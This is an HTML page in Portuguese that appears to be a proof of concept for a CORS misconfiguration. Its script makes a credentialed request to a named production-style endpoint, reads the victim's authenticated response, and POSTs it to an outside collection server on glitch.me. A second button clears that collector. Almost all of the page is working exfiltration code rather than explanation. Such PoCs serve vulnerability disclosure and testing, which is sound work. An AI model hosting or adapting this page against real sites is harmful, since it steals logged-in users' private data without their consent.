<!DOCTYPE html>
<html>
<head>
    <title>PoC de CORS - Payload Alyce</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #555;
        }
        .status {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            background-color: #f9f9f9;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <h1>PoC de CORS - Payload Alyce</h1>
    <p>Esta página demonstra a vulnerabilidade CORS com origem arbitrária confiável.</p>
    <p>Abaixo demonstra a interceptação das informações da sua página.</p>

    <button onclick="validateCORS()">Verificar Vulnerabilidade</button>
    <button onclick="clearData()">Limpar Dados</button>

    <div class="status" id="status">
        Status: Aguardando verificação...
    </div>

    <script>
        function validateCORS() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://qa.neoway.com.br/pathfinder/ws/', true);
            xhr.withCredentials = true;
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    var statusDiv = document.getElementById('status');
                    console.log('XHR Status:', xhr.status);
                    console.log('XHR Response:', xhr.responseText);
                    if (xhr.status == 200) {
                        statusDiv.innerHTML = 'Status: Sucesso! Dados recebidos: ' + xhr.responseText;
                        statusDiv.style.borderColor = 'green';
                        statusDiv.style.backgroundColor = '#e0ffe0';
                        // Enviar dados para o servidor de coleta
                        var exfiltrate = new XMLHttpRequest();
                        exfiltrate.open('POST', 'https://potent-intriguing-dichondra.glitch.me/collect', true);
                        exfiltrate.setRequestHeader('Content-Type', 'application/json');
                        exfiltrate.send(JSON.stringify({data: xhr.responseText}));
                    } else {
                        statusDiv.innerHTML = 'Status: Falha ao obter dados. Código de status: ' + xhr.status;
                        statusDiv.style.borderColor = 'red';
                        statusDiv.style.backgroundColor = '#ffe0e0';
                    }
                }
            };
            xhr.onerror = function() {
                var statusDiv = document.getElementById('status');
                statusDiv.innerHTML = 'Status: Erro na solicitação.';
                statusDiv.style.borderColor = 'red';
                statusDiv.style.backgroundColor = '#ffe0e0';
                console.error('Erro na solicitação:', xhr);
            };
            xhr.send();
        }

        function clearData() {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://potent-intriguing-dichondra.glitch.me/clear', true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    var statusDiv = document.getElementById('status');
                    console.log('Clear Data XHR Status:', xhr.status);
                    console.log('Clear Data XHR Response:', xhr.responseText);
                    if (xhr.status == 200) {
                        statusDiv.innerHTML = 'Status: Dados apagados com sucesso!';
                        statusDiv.style.borderColor = 'blue';
                        statusDiv.style.backgroundColor = '#e0f7ff';
                    } else {
                        statusDiv.innerHTML = 'Status: Falha ao apagar dados. Código de status: ' + xhr.status;
                        statusDiv.style.borderColor = 'red';
                        statusDiv.style.backgroundColor = '#ffe0e0';
                    }
                }
            };
            xhr.onerror = function() {
                var statusDiv = document.getElementById('status');
                statusDiv.innerHTML = 'Status: Erro na solicitação de limpeza.';
                statusDiv.style.borderColor = 'red';
                statusDiv.style.backgroundColor = '#ffe0e0';
                console.error('Erro na solicitação de limpeza:', xhr);
            };
            xhr.send();
        }
    </script>
</body>
</html>
